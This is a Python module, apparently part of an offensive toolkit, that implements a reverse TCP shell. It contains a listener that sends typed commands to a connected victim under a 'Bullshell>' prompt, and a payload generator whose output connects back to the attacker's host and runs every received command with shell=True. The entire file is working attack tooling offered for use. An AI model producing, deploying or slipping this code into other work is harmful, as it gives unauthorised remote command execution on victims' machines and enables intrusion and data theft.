
#basic module description
def description():
    return "Reverse TCP Win64"

#basic module rank
def rank():
    return "Good"

#basic module date
def date():
    return "18.04.2026"

#set arguments
def depargs():
    return {
        "host": "IPv4 addr",
        "port": "Port"
    }

#imports
from StrFuncs import err, evnt, datetime
import socket
from colorama import Fore, Style

#main function
def main(ip, port):
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        print(f"{evnt()} Listening for incoming connection...")
        conn, addr = s.accept()
        print(f"{evnt()} Connection established from: {addr}")
        while True:
            command = input(f"{Fore.RED}Bullshell>{Style.RESET_ALL}")
            conn.send(command.encode())
            print(conn.recv(1024).decode())
    except Exception as error:
        print(f"{err()} {error}")

#launch func
def launch(args):
    ip = args.get("host")
    port = int(args.get("port"))
    main(ip, port)



#source code (only for payloads)
def code(rhost, rport):
    return f"""
import socket
import subprocess
import os
lhost = "{rhost}"
lport = {rport}
def connect():
    try:
        s = socket.socket()
        s.connect((lhost, lport))
        while True:
            data = s.recv(1024)
            if data.decode("utf-8").strip() == "terminate":
                s.close()
                break
            if data.decode("utf-8").startswith("cd "):
                os.chdir(data.decode("utf-8")[3:].strip())
                continue
            if len(data) > 0:
                proc = subprocess.Popen(data.decode("utf-8"), shell=True, 
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                        stdin=subprocess.PIPE)
                stdout = proc.stdout.read() + proc.stderr.read()
                s.send(stdout)
    except Exception as err:
        print(err)
if __name__ == "__main__":
    connect()
"""
